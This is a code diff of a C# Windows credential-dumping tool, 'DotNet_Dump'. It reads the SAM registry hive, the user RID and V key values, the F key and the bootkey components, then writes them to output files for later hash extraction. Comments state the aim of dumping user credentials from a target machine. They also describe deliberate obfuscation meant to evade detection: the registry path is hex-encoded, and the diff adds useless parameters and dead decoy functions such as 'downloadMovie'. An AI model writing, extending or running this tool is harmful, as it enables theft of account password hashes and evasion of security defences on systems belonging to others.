@@ -10,14 +10,15 @@ using System.Threading.Tasks;
 using System.Diagnostics;
 using System.Security.Principal;
 
-
-// could export a bunch of different functions that do nothing ---> TODO
-// export without name; only export ordinal ---> TODO
-// use useless parameters
-// dont store any important hard coded stirngs; get them from the environment
-// useless checks and function calls 
-// useless namespaces referrenced 
-
+/**
+ * The purpose of this program is to parse the reigstry of the target machine for those registry keys we know we need to dump user credentials
+  * This code is a bit of a mess, but mainly for obfucscation reasons (rudimentary, but its something):
+  * Pass useless parameters to functions 
+  * Try our best to not store complete paths or hardcoded strings; get what we can from the environment
+  * Add useless checks and function calls 
+  * Reference uselss namespaces
+  * Add functions that are either not referenced or do nothing 
+*/
 
 namespace DotNet_Dump
 {
@@ -34,7 +35,7 @@ namespace DotNet_Dump
         [DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError = true)]
         public static extern int RegCloseKey(UIntPtr hKey);
 
-        [DllImport("kernel32.dll")]
+        [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError =true)]
         static extern uint GetLastError();
 
         static void Main(string[] args)
@@ -105,25 +106,18 @@ namespace DotNet_Dump
         static string genKey(in int uselessVar1, in string uselessVar2)
         {
             string key = "";
-            // SAM\SAM\Domains\Account\Users
             string users = "53 41 4D 5C 53 41 4D 5C 44 6F 6D 61 69 6E 73 5C 41 63 63 6F 75 6E 74 5C 55 73 65 72 73";
             string[] userBytes = users.Split(' ');
-
-            //Debug.WriteLine(" user bytes is " + userBytes);
 
             // Translate
             foreach (string hex in userBytes)
             {
                 int value = Convert.ToInt32(hex, 16);
 
-                //Debug.WriteLine("char value is " + (char)value);
-
                 string stringValue = Char.ConvertFromUtf32(value);
 
                 key += (char)value;
             }
-
-            Debug.WriteLine("registry key is " + key);
                               
             RegistryKey openKey = Registry.LocalMachine.OpenSubKey(key);
            
@@ -135,7 +129,7 @@ namespace DotNet_Dump
          * Input:
          *      fKeyValue - value of the F key
          * Return:
-         *      The translated stirng key to our users on target
+         *      status - success or failure
          * */
         static int grabFKey(out string fKeyValue)
         {
@@ -162,7 +156,7 @@ namespace DotNet_Dump
          *      userRids - array to be filled with all user RIDs on target
          *      userValues - array to be filled with each user's V key
          * Return:
-         *      The translated stirng key to our users on target
+         *      status - success or failure
          * */
         static int grabUserInfo(in string key, out string[] userRids, out string[] userValues)
         {
@@ -197,7 +191,7 @@ namespace DotNet_Dump
 
                     else
                     {
-                        Debug.WriteLine("user rid is " + user);
+                        Debug.WriteLine("User RID is " + user);
                     }
 
                     userRids[index] = user;
@@ -209,8 +203,6 @@ namespace DotNet_Dump
                     {
                         bytes.Append(vValue[i].ToString("x2"));
                     }
-
-                    Debug.WriteLine("bytes are " + bytes.ToString());
 
                     userValues[index] = bytes.ToString(); 
 
@@ -236,8 +228,7 @@ namespace DotNet_Dump
          *      bootKeyValue - JD + Skew1 + GBG + Data keys we need for the bootkey 
          * Return:
          *      N/A
-         * */
-        //static void getBootKeyValues(out string[] bootKeyValues)
+         * */    
         static void getBootKeyValue(out string bootKeyValue)
         {
             RegistryKey bootKeyPath = Registry.LocalMachine;
@@ -290,10 +281,12 @@ namespace DotNet_Dump
         /* Dump all info to appropiate output files
          * Input:
          *      bootKeyValues - JD, Skew1, GBG and Data keys we need for the bootkey 
+         *      userRids - array of user RIDs
+         *      userValues - array of V key values for each user (1:1 correspondence)
+         *      fKeyValue - F key value read from registry
          * Return:
          *      N/A
-         * */
-        //static void dumpInfo(in string[] bootKeyValues, in string[] userRids, in string[] userValues, string fKeyValue)
+         * */     
         static void dumpInfo(in string bootKeyValue, in string[] userRids, in string[] userValues, string fKeyValue)
         {
             string dirName = "\\out";
@@ -304,8 +297,6 @@ namespace DotNet_Dump
 
             // Make a dir for all the files
             di = Directory.CreateDirectory(Directory.GetCurrentDirectory() +  dirName);
-
-            Debug.WriteLine("dirname is " +  di.Name);
 
             // Each filename will be a user RID
             foreach (string userRid in userRids)
@@ -338,9 +329,16 @@ namespace DotNet_Dump
             return;
         }
 
-
         // Add random functions that do nothing ?
+        static void downloadMovie()
+        {
+            int cookie = 0x98221;
 
+
+
+
+            return;
+        }
 
 
 
